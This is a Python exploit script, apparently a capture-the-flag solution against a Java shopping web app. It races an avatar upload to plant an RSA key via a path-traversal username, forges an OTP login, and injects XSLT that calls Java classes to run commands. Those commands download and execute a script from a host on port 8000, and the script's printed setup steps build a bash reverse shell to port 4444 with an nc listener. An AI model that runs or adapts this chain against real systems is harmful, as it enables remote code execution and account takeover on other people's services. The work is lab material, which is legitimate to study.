import requests
import threading
import time
import re

from base64 import b64encode
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature import PKCS1_v1_5

_TARGET_IP = "172.17.0.1"
_SCRPT_NAME = "98c36ab6de1f.sh"
_TMPLT = """<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java">
<xsl:template match="/">
<xsl:variable name="py70d" select="java:java.lang.String.new('{payload}')"/>
<xsl:variable name="p4r4m" select="java:split($py70d, ' ')"/>
<xsl:variable name="p4rt3" select="java:org.ibctf.model.Partner.new()"/>
<xsl:variable name="av4t4" select="java:getAvatar($p4rt3)"/>
<xsl:variable name="fs3rv" select="java:org.ibctf.service.FileService.new($av4t4)"/>
<xsl:variable name="own3d" select="java:run($fs3rv, $p4r4m)"/>
<xsl:value-of select="$own3d"/>
</xsl:template>
</xsl:stylesheet>"""
_TMPLT_PL_1 = f"wget {_TARGET_IP}:8000/{_SCRPT_NAME}"
_TMPLT_PL_2 = f"chmod +x {_SCRPT_NAME}"
_TMPLT_PL_3 = f"./{_SCRPT_NAME}"
_TMPLT_PL_4 = f"rm -rf ./{_SCRPT_NAME}"

class User:

	USER_ONE_NAME = "25th12ok"
	USER_ONE_PASS = "25th12ok-pAsswd?2"
	USER_TWO_NAME = "ajvndm1e2"

	def __init__(self, username, password, challenge=b"4KwbB9UU3Z", auth=None):
		self.username = username
		self.password = password
		self.challenge = challenge
		self.auth = auth
		
class Item:
	
	def __init__(self, name, description, price):
		self.name = name
		self.description = description
		self.price = price
		
class WebApp:

	REGISTER_PATH = "/register"
	LOGIN_PATH = "/login"
	AVATAR_PATH = "/avatar"
	OTP_PATH = "/otp"
	TEMPLATE_PATH = "/template"
	ITEM_PATH = "/item"
	PROCESS_PATH = "/process"
	
	AUTH_COOKIE_NAME = "ShoppingPartnersAuth"

	def __init__(self, host="http://localhost:8080"):
		self.host = host

	def register(self, user):
		r = requests.post(self.host + self.REGISTER_PATH, data=user.__dict__)
		if r.status_code != 200:
			raise ValueError(f"registration failed with user {user.__dict__}")
			
	def auth(self, user, path) -> str:
		r = requests.post(self.host + path, data=user.__dict__, allow_redirects=False)
		if r.status_code != 302:
			raise ValueError(f"login failed with user {user.__dict__}")
		user.auth = r.cookies.get(self.AUTH_COOKIE_NAME)
		return user.auth
		
	def login(self, user) -> str:
		return self.auth(user, self.LOGIN_PATH)
		
	def otp(self, user) -> str:
		return self.auth(user, self.OTP_PATH)
		
	def upload_file(self, user, filename, filebytes):
		if not user.auth:
			raise ValueError("unauthenticated")
		c = {self.AUTH_COOKIE_NAME: user.auth}
		f = {"file": (filename, filebytes)}
		r = requests.post(self.host + self.AVATAR_PATH, files=f, cookies=c, allow_redirects=False)
		if r.status_code != 302:
			raise ValueError(f"upload failed with provided file")
			
	def template(self, user, templatebytes):
		if not user.auth:
			raise ValueError("unauthenticated")
		c = {self.AUTH_COOKIE_NAME: user.auth}
		d = {"template": templatebytes}
		r = requests.post(self.host + self.TEMPLATE_PATH, data=d, cookies=c, allow_redirects=False)
		if r.status_code != 302:
			raise ValueError(f"template set failed")
			
	def item(self, user, item):
		if not user.auth:
			raise ValueError("unauthenticated")
		c = {self.AUTH_COOKIE_NAME: user.auth}
		r = requests.post(self.host + self.ITEM_PATH, data=item.__dict__, cookies=c, allow_redirects=False)
		if r.status_code != 302:
			raise ValueError(f"item create failed")
			
	def index(self, user):
		if not user.auth:
			raise ValueError("unauthenticated")
		c = {self.AUTH_COOKIE_NAME: user.auth}
		r = requests.get(self.host, cookies=c)
		return r.text
		
	def export_item(self, user, item_id):
		if not user.auth:
			raise ValueError("unauthenticated")
		c = {self.AUTH_COOKIE_NAME: user.auth}
		r = requests.get(self.host + f"{self.PROCESS_PATH}?id={item_id}", cookies=c)
		return r.text
	
			
def action_user_one(webapp, pubkey_der, event):
	u1 = User(User.USER_ONE_NAME, User.USER_ONE_PASS)
	webapp.register(u1)
	webapp.login(u1)

	while not event.is_set():
		try:
			webapp.upload_file(u1, f"{User.USER_TWO_NAME}.pub", pubkey_der)
		except KeyboardInterrupt:
			break
		except Exception as e:
			print(f"u1: {e}")
	print("[!] user one exits")
		
def action_user_two(webapp, privkey, event):
	chall = "abc"
	p = PKCS1_v1_5.new(privkey)
	signature = p.sign(SHA256.new(chall.encode()))
	password = b64encode(signature)
	
	u2 = User(f"../../../../../../tmp/{User.USER_TWO_NAME}", password.decode(), challenge=chall)
	w.register(u2)
	while not u2.auth:
		try:
			w.otp(u2)
		except KeyboardInterrupt:
			break
		except Exception as e:
			print(f"u2: {e}")
	event.set()
	time.sleep(1)
	
	print(f"""
[!] user two auth: {u2.auth}
execute following in first terminal:
  mkdir server && cd server
    (for bash use:)
  echo -ne '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/{_TARGET_IP}/4444 0>&1' > {_SCRPT_NAME}
    (for sh use:)
  echo '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/{_TARGET_IP}/4444 0>&1' > {_SCRPT_NAME}
  python3 -m http.server
execute in second terminal:
  nc -nlvp 4444

press ENTER to continue""")
	input()
	
	w.item(u2, Item('a', 'a', 1))
	html = w.index(u2)
	links = re.findall('href="/item\?id=(.*)"', html)
	if (len(links) == 0):
		print("[!] no links matched, what?")
		print(f"links: {links}")
		return

	link1 = links[0]
	print("[+] brace for shell")
	for i in [_TMPLT_PL_1, _TMPLT_PL_2, _TMPLT_PL_3, _TMPLT_PL_4]:
		p = _TMPLT.format(payload=i)
		w.template(u2, p)
		w.export_item(u2, link1)

		
if __name__ == "__main__":
	private_key = RSA.generate(2048)
	public_key = private_key.publickey()
	
	w = WebApp()
	event = threading.Event()
	
	t1 = threading.Thread(target=action_user_one, args=(w, public_key.exportKey("DER"), event))
	t2 = threading.Thread(target=action_user_two, args=(w, private_key, event))
	t1.start()
	t2.start()
	t1.join()
	t2.join()

